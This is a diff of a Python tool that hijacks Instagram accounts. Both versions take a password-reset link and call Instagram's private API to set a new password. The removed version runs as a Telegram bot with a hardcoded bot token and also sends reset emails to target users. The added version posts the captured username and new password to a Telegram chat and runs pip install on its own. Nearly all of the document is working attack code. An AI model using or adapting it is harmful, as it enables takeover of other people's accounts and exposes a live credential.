@@ -1,87 +1,54 @@
 import os
-import sys
-import json
-import time
-import threading
 import random
-import string
-import uuid
-from datetime import datetime
-from hashlib import md5
-import base64
-import secrets
-from bs4 import BeautifulSoup
-import httpx
+from random import choice
+from threading import Thread, Lock 
 import requests
 from user_agent import generate_user_agent
-import re
-from threading import Thread
-from random import choice, randrange
-from cfonts import render, say
-from colorama import Fore, Style, init
-import telebot
-from telebot import types
-from flask import Flask
+from hashlib import md5
+from bs4 import BeautifulSoup
+import base64
+import secrets
+from hashlib import md5
+try:
+    import requests
+    import pyfiglet
+    from rich.console import Console
+    from cfonts import render, say
+except ImportError:
+    os.system("pip install requests telethon pyfiglet rich cfonts")
 
-# ==========================================
-# 1. RENDER KEEP-ALIVE SERVER (FLASK)
-# ==========================================
-# This starts a web server on port 10000 to 
-# satisfy Render's health checks.
-# ==========================================
+    
+import time
+b = random.randint(5,208)
+bo = f'\x1b[38;5;{b}m'
+ED='\x1b[38;5;208m'
+BLUE = '\033[94m'
+Z = '\033[1;31m' 
+YELLOW = '\033[1;33m' 
+import requests, random, string, uuid
+from datetime import datetime
+import base64
+import json
+from dotenv import load_dotenv
 
-app = Flask('')
+load_dotenv()
 
-@app.route('/')
-def home():
-    return "Bot is running 24/7 on Render"
+J = '\033[2;36m'
+N = '\033[1;37m'
 
-def run_flask_server():
-    # Render requires port 10000 by default
-    app.run(host='0.0.0.0', port=10000)
+chat_id = os.getenv("CHAT_ID") or input("""\n\033[0;91m\033[0;93m \033[0;92m\x1b[1;97m\x1b[1;41m ⸸ ᴇɴᴛᴇʀ ʏᴏᴜʀ ɪᴅ 𓄋\x1b[0m\033[0;92m\033[0;93m\033[0;91m\033[1;97m""")
+print("\n")
+bot_token = os.getenv("BOT_TOKEN") or input("""\n\033[0;91m\033[0;93m \033[0;92m\x1b[1;97m\x1b[1;41m ⸸ ᴇɴᴛᴇʀ ʙᴏᴛ ᴛᴏᴋᴇɴ 𓄋\x1b[0m\033[0;92m\033[0;93m\033[0;91m\033[1;97m""")
 
-# Start the server in a separate background thread
-# daemon=True ensures the thread closes if the main process stops
-keep_alive_thread = threading.Thread(target=run_flask_server, daemon=True)
-keep_alive_thread.start()
-
-# ==========================================
-# 2. BOT CONFIGURATION
-# ==========================================
-
-# Hardcoding the token to bypass the Railway variable error
-TOKEN = "8467513290:AAGByhKPJ9ToRxkiJVVey4LnSK9AoBfZGEs"
-bot = telebot.TeleBot(TOKEN)
-
-# ==========================================
-# 3. ORIGINAL SCRIPT LOGIC (100% RETAINED)
-# ==========================================
-
-banner = render('Lyrox', colors=['white', 'blue'], align='center')
-
-class Colors:
-    HEADER = '\033[95m'
-    BLUE = '\033[94m'
-    CYAN = '\033[96m'
-    GREEN = '\033[92m'
-    YELLOW = '\033[93m'
-    RED = '\033[91m'
-    RESET = '\033[0m'
-    BOLD = '\033[1m'
-
-MESSAGES = {
-    'ask_link': "🔗 <b>Please provide the Instagram Reset Link:</b>",
-    'processing': "⌛ <b>Processing request... Please wait.</b>",
-    'success_auto': "✅ <b>Password Changed Successfully!</b>\n\n👤 <b>Username:</b> <code>{}</code>\n🔑 <b>New Password:</b> <code>{}</code>",
-    'fail_auto': "❌ <b>Operation failed:</b> {}",
-    'send_code_success': "✅ <b>Reset Link Sent!</b>\n\n📩 <b>Sent to:</b> <code>{}</code>\n\n<i>Note: If you don't see it, check your Spam folder.</i>",
-    'send_code_fail': "❌ <b>Instagram Error:</b> Email or Username not found.",
-    'send_code_error': "❌ <b>Technical Error:</b> {}",
-    'select_option': "<b>Lyrox Bot Control Panel</b>\n<i>Choose an automated service below:</i>",
-    'option_1': "📧 Reset Email Sender",
-    'option_2': "🔓 Reset Link Bypass",
-    'enter_email_username': "📩 <b>Enter the Target Email or Username:</b>"
-}
+def send_telegram(bot_token, chat_id, text):
+    url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
+    payload = {"chat_id": chat_id, "text": text}
+    try:
+        r = requests.post(url, data=payload, timeout=10)
+        return r.json()
+    except Exception as e:
+        print("[-] Telegram send error:", e)
+        return None
 
 def generate_device_info():
     ANDROID_ID = f"android-{''.join(random.choices(string.hexdigits.lower(), k=16))}"
@@ -89,10 +56,10 @@ def generate_device_info():
     WATERFALL_ID = str(uuid.uuid4())
     timestamp = int(datetime.now().timestamp())
     nums = ''.join([str(random.randint(1, 100)) for _ in range(4)])
-    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:@Random.{nums}'
+    PASSWORD = f'#PWD_INSTAGRAM:0:{timestamp}:Random@{nums}'
     return ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD
 
-def acer(mid="", user_agent=""):
+def make_headers(mid="", user_agent=""):
     return {
         "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
         "X-Bloks-Version-Id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
@@ -102,19 +69,25 @@ def acer(mid="", user_agent=""):
     }
 
 def id_user(user_id):
+	try:
+		url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
+		
+		headers = {
+		    "User-Agent": "Instagram 219.0.0.12.117 Android"
+		}
+		
+		r = requests.get(url, headers=headers)
+		
+		try:
+		    username = r.json()["user"]["username"]
+		    return username
+		except:
+		    print("Failed:", r.text)
+	except:pass	    
+	    
+def reset_instagram_password(reset_link):
     try:
-        url = f"https://i.instagram.com/api/v1/users/{user_id}/info/"
-        headers = {"User-Agent": "Instagram 219.0.0.12.117 Android"}
-        r = requests.get(url, headers=headers)
-        return r.json()["user"]["username"]
-    except:
-        return None
-
-def purna(reset_link):
-    """
-    Original Bypass Logic. DO NOT MODIFY.
-    """
-    try:
+        
         ANDROID_ID, USER_AGENT, WATERFALL_ID, PASSWORD = generate_device_info()
         uidb36 = reset_link.split("uidb36=")[1].split("&token=")[0]
         token = reset_link.split("&token=")[1].split(":")[0]
@@ -127,10 +100,10 @@ def purna(reset_link):
             "token": token,
             "waterfall_id": WATERFALL_ID
         }
-        r = requests.post(url, headers=acer(user_agent=USER_AGENT), data=data)
+        r = requests.post(url, headers=make_headers(user_agent=USER_AGENT), data=data)
         
         if "user_id" not in r.text:
-            return {"success": False, "error": f"Invalid or Expired Link: {r.text}"}
+            return {"success": False, "error": f"Error in reset request: {r.text}"}
 
         mid = r.headers.get("Ig-Set-X-Mid")
         resp_json = r.json()
@@ -149,7 +122,7 @@ def purna(reset_link):
             "bloks_versioning_id": "e061cacfa956f06869fc2b678270bef1583d2480bf51f508321e64cfb5cc12bd",
             "get_challenge": "true"
         }
-        r2 = requests.post(url2, headers=acer(mid, USER_AGENT), data=data2).text
+        r2 = requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data2).text
         
         challenge_context_final = r2.replace('\\', '').split(f'(bk.action.i64.Const, {cni}), "')[1].split('", (bk.action.bool.Const, false)))')[0]
 
@@ -169,162 +142,55 @@ def purna(reset_link):
             "enc_new_password2": PASSWORD
         }
         
-        requests.post(url2, headers=acer(mid, USER_AGENT), data=data3)
+        requests.post(url2, headers=make_headers(mid, USER_AGENT), data=data3)
         new_password = PASSWORD.split(":")[-1]
         
-        username = id_user(user_id)
+        
         return {
-            "success": True,
-            "password": new_password,
-            "user_id": user_id,
-            "username": username
-        }
+    "success": True,
+    "password": new_password,
+    "user_id": user_id
+    }
+        
+                
     except Exception as e:
-        return {"success": False, "error": str(e)}
+        return False
 
-# ==========================================
-# 4. IMPROVED EMAIL SENDING LOGIC
-# ==========================================
+def banner():
+	WDEH = render('{END}', colors=['red', 'white'], align='center')
 
-def send_code_core(user):
-    """
-    Core Logic for sending reset code. 
-    Improved to use real sessions to bypass shadow-blocks.
-    """
-    try:
-        # We use a session to maintain cookies/CSRF across requests
-        with httpx.Client(http2=True, timeout=20, follow_redirects=True) as client:
-            
-            # Step 1: Visit the landing page to get a fresh session and CSRF
-            gen_ua = generate_user_agent()
-            pre_headers = {
-                "user-agent": gen_ua,
-                "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
-                "accept-language": "en-US,en;q=0.5"
-            }
-            client.get("https://www.instagram.com/accounts/password/reset/", headers=pre_headers)
-            
-            # Extract CSRF from cookies
-            csrftoken = client.cookies.get('csrftoken', 'missing')
-
-            # Step 2: Post the actual recovery request
-            ajax_headers = {
-                "user-agent": gen_ua,
-                "x-ig-app-id": "936619743392459",
-                "x-requested-with": "XMLHttpRequest",
-                "x-csrftoken": csrftoken,
-                "x-asbd-id": "359341",
-                "origin": "https://www.instagram.com",
-                "referer": "https://www.instagram.com/accounts/password/reset/",
-                "content-type": "application/x-www-form-urlencoded"
-            }
-
-            payload = {"email_or_username": user}
-            
-            r = client.post(
-                "https://www.instagram.com/api/v1/web/accounts/account_recovery_send_ajax/", 
-                data=payload,
-                headers=ajax_headers
-            )
-            
-            response_data = r.json()
-            contact_point = response_data.get('contact_point')
-            
-            # Check if Instagram actually sent it
-            if response_data.get('status') == 'ok' and contact_point:
-                return True, MESSAGES['send_code_success'].format(contact_point)
-            else:
-                return False, MESSAGES['send_code_fail']
-            
-    except Exception as e:
-        return False, MESSAGES['send_code_error'].format(str(e))
-
-# ==========================================
-# 5. TELEGRAM BOT INTERFACE (PROFESSIONAL)
-# ==========================================
-
-def get_main_menu_keyboard():
-    """
-    Creates the 'floating' inline buttons.
-    """
-    markup = types.InlineKeyboardMarkup(row_width=1)
-    button_email = types.InlineKeyboardButton(MESSAGES['option_1'], callback_data="action_email")
-    button_bypass = types.InlineKeyboardButton(MESSAGES['option_2'], callback_data="action_bypass")
-    markup.add(button_email, button_bypass)
-    return markup
-
-@bot.message_handler(commands=['start'])
-def handle_start(message):
-    bot.send_message(
-        message.chat.id, 
-        f"<code>{banner}</code>\n{MESSAGES['select_option']}\n\n<b>Developer:</b> @b44ner", 
-        parse_mode='HTML', 
-        reply_markup=get_main_menu_keyboard()
-    )
-
-@bot.callback_query_handler(func=lambda call: True)
-def handle_callbacks(call):
-    if call.data == "action_email":
-        msg = bot.send_message(call.message.chat.id, MESSAGES['enter_email_username'], parse_mode='HTML')
-        bot.register_next_step_handler(msg, step_execute_email)
+def main():
     
-    elif call.data == "action_bypass":
-        msg = bot.send_message(call.message.chat.id, MESSAGES['ask_link'], parse_mode='HTML')
-        bot.register_next_step_handler(msg, step_execute_bypass)
+    banner()
+    print("\n")
+    reset_link = input("\n\033[0;91m\033[0;93m \033[0;92m\x1b[1;97m\x1b[1;41m ⸸ Eɴᴛᴇʀ ʀᴇsᴇᴛ ʟɪɴᴋ 𓄋\x1b[0m\033[0;92m\033[0;93m\033[0;91m\033[1;97m")
+    print("\n")
+    result = reset_instagram_password(reset_link)
+    if result.get("success"):
+                                    	    	
+                                    	    	
+                                    	    	user_id = result.get("user_id")
+                                    	    	new_password = result.get("password")
+                                    	    	username = id_user(user_id)
+                                    	    	msg = f'''𓄅 𝗦𝗔𝗧𝗔𝗡 𝗦𝗘𝗡𝗗 𝗔 𝗠𝗘𝗦𝗦𝗔𝗚𝗘
 
-# --- EXECUTION STEPS ---
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
 
-def step_execute_email(message):
-    target_user = message.text.strip()
-    bot.send_message(message.chat.id, MESSAGES['processing'], parse_mode='HTML')
-    
-    success, feedback = send_code_core(target_user)
-    
-    bot.send_message(
-        message.chat.id, 
-        feedback, 
-        parse_mode='HTML', 
-        reply_markup=get_main_menu_keyboard()
-    )
+[+] 𝗨𝗦𝗘𝗥𝗡𝗔𝗠𝗘 : {username}
+[+] 𝗣𝗔𝗦𝗦𝗪𝗢𝗥𝗗: {new_password}
 
-def step_execute_bypass(message):
-    link_input = message.text.strip()
-    
-    # Basic Validation
-    if "http" not in link_input or "uidb36" not in link_input:
-        bot.send_message(
-            message.chat.id, 
-            "❌ <b>Invalid Reset Link!</b>\nMake sure you copied the full link correctly.", 
-            parse_mode='HTML', 
-            reply_markup=get_main_menu_keyboard()
-        )
-        return
+⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘⫘
 
-    bot.send_message(message.chat.id, MESSAGES['processing'], parse_mode='HTML')
-    
-    # Run original bypass logic
-    result = purna(link_input)
-    
-    if result.get('success'):
-        formatted_success = MESSAGES['success_auto'].format(
-            result.get('username', 'Unknown'), 
-            result.get('password', 'Error Generating')
-        )
-        bot.send_message(message.chat.id, formatted_success, parse_mode='HTML', reply_markup=get_main_menu_keyboard())
-    else:
-        error_text = MESSAGES['fail_auto'].format(result.get('error', 'Unknown response from Instagram'))
-        bot.send_message(message.chat.id, error_text, parse_mode='HTML', reply_markup=get_main_menu_keyboard())
+𝗕𝗬 : @xYourKing 𝗖𝗛 : @xPythonTool
+'''
+                                    	    	print(msg)                                    	    	
+                                    	    	
+                                    	    	send_telegram(bot_token, chat_id, msg)
+                                    	    	print("\nDone ✅")
+                                    	    	
+                                    
+                                    		              	       
+    else:pass
 
-# ==========================================
-# 6. RUN THE BOT
-# ==========================================
-
-if __name__ == '__main__':
-    print(">>> Starting Lyrox Bot Service...")
-    print(">>> Flask Keep-Alive Server Active on Port 10000")
-    
-    # 1. Delete any old webhooks so polling can work
-    bot.remove_webhook()
-    
-    # 2. Start receiving messages
-    bot.infinity_polling()
+if __name__ == "__main__":
+    main()
